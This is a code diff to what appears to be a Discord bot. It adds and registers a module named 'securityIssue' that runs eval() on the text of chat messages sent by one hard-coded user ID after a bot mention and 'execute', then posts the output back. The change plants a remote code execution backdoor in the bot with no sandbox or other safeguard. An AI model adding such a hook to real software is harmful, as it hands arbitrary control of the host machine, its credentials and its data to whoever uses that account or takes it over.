@@ -849,6 +849,30 @@ tempModules.createThread = {
     }
   }
 };
+tempModules.securityIssue = {
+  name: "securityIssue",
+  onDispatch: (bot,msg) => {
+    if (msg.t === "MESSAGE_CREATE" && msg.d.author.id === "163718745888522241"){
+      try {
+        if (/^<@870750872504786944> execute /.test(msg.d.content))
+          replyToMessage(msg.d,""+eval(msg.d.content.substring("<@870750872504786944> execute ".length))).then(a=>
+            {
+              lastRet = a;
+              if (a.ret!==200) {
+                console.log(a);
+                lastRet = JSON.parse(lastRet.res);
+                sendMessage(msg.d.channel_id,"Failed to respond: "+((lastRet.message && lastRet.code)?"code: "+lastRet.code+"\nmessage: "+lastRet.message:"code: "+a.ret+"\nmessage: "+a.res));
+              }
+            })
+      } catch (err) {
+        let errstr = err.toString();
+        if (JSON.stringify(errstr).length>=2000)
+          errstr = errstr.substring(0,1500);
+        replyToMessage(msg.d, errstr);
+      }
+    }
+  }
+}
 
 
 
@@ -862,5 +886,6 @@ bot.addModule(modules.embeds)
 
 
 bot.addModule(tempModules.createThread)
+bot.addModule(tempModules.securityIssue)
 
 
